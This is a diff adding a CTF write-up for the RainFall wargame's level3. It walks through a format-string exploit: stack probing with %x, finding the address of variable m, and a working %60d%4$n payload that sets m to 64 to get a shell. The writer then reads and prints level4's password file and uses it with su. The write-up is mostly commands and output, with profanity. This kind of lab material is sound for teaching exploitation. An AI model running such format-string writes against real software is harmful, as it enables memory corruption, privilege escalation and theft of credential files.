@@ -486,4 +486,87 @@ breakpoint at leave instruction inside p function, now eip points to **0xbffff72
 
 **this doesnt lead ANYWHERE, kill me**
 
-## BEEN TOLD TO START WITH THE FUCKING BASICS, SO I WILL BE BACK TO FINISH THIS
+### BEEN TOLD TO START WITH THE FUCKING BASICS, SO I WILL BE BACK TO FINISH THIS
+## level3, fuck the basics
+**format strings, again**
+
+%n *Number of bytes written so far, writes the number of bytes till the format string to memory*
+
+*if the function printf didn’t find a corresponding variable or value on stack so it will start poping values off the stack*
+```
+level3@RainFall:~$ python -c 'print "%08x "*20' | ./level3 
+00000200 b7fd1ac0 b7ff37d0 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520
+```
+*program returned values and addresses saved on the stack*
+```
+level3@RainFall:~$ python -c 'print "AAAA%08x "*20' | ./level3 
+AAAA00000200 AAAAb7fd1ac0 AAAAb7ff37d0 AAAA41414141 AAAA78383025 AAAA41414120 AAAA38302541 AAAA41412078 AAAA30254141 AAAA41207838 AAAA25414141 AAAA20783830 AAAA41414141 AAAA78383025 AAAA41414120 AAAA38302541 AAAA41412078 AAAA30254141 AAAA41207838 AAAA25414141
+```
+*when supplying a string before the format string, the value "41414141" was popped off the stack, meaning the prepended string is written on the stack*
+
+the string "AAAA" is also returned from stack as the 4th item, so
+```
+level3@RainFall:~$ python -c 'print "AAAA.%4$x"' | ./level3 
+AAAA.41414141
+```
+*direct access to 4th parameter on stack using **$** sign qualifier, "%4$x" to read 4th parameter on stack*
+```
+level3@RainFall:~$ ltrace ./level3 
+__libc_start_main(0x804851a, 1, 0xbffff7f4, 0x8048530, 0x80485a0 <unfinished ...>
+fgets(AAAA%X%X%X%X%X%X%X%X
+"AAAA%X%X%X%X%X%X%X%X\n", 512, 0xb7fd1ac0)                      = 0xbffff540
+printf("AAAA%X%X%X%X%X%X%X%X\n", 0x200, 0xb7fd1ac0, 0xb7ff37d0, 0x41414141, 0x58255825, 0x58255825, 0x58255825, 0x58255825AAAA200B7FD1AC0B7FF37D04141414158255825582558255825582558255825
+) = 64
++++ exited (status 0) +++
+```
+#### program uses a static variable [m], compares it to 0x40 then redirects to shell or nor
+```
+level3@RainFall:~$ objdump -t ./level3 | grep bss
+0804988c g     O .bss   00000004              m
+```
+*address of m variable*
+
+So need to write the value 64 into that address using %n
+
+The thing is, the implementation of printf here is bad, it is called with one argument, which is the one from fgets, through stdin, so **printf(buff)**, instead of **printf("%s",buff)**.
+
+So, when buffer is a string of %x, it tries to read arguments on the stack. we have the address of the variable we wish to write to **0x0804988c** and value to override it with **0x40 = 64**.
+
+```
+level3@RainFall:~$ ./level3 
+%x
+200
+```
+*it prints argument thats below its first argument, which is 0x200, that's at **$esp + 0x4 = $ebp - 0x214***
+
+stack starts at **$esp = $ebp - 0x218**
+
+then 2nd arg of gets follows at **$esp + 0x4 = $ebp - 0x214**
+
+then 1st argument of gets at **$esp + 0x8 = $ebp - 0x210**
+
+Need to write 64 bytes in the buffer, starting with the address of [m] variable where the value of %n is saved (number of bytes written up to that)
+```
+level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08 %x %x %x %x'" > /tmp/r
+level3@RainFall:~$ cat /tmp/r | ./level3 
+� 200 b7fd1ac0 b7ff37d0 804988c
+```
+*address is we put as first argument is popped as 4th in stack*
+
+Soooo
+```
+level3@RainFall:~$ cat <(python -c "print('\x8c\x98\x04\x08%60d%4\$n')") - | ./level3
+```
+*first the address of 4 bytes, where we will save the number of bytes printed **64**, so 4 are printed, we only then need 60 more, using the **%60d**, 60 is the value of the **width** parameter of printf, prints spaces needed to complete that width, then **%4$n** will save the number of bytes printed, at the address stored as the 4th modifier parameter, moving 4 addresses inside the stack, that address that we wrote ourselves on the stack*
+```
+level3@RainFall:~$ cat <(python -c "print('\x8c\x98\x04\x08%60d%4\$n')") - | ./level3
+�                                                         512
+Wait what?!
+ls
+ls: cannot open directory .: Permission denied
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+level3@RainFall:~$ su level4 
+Password:b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+## level4
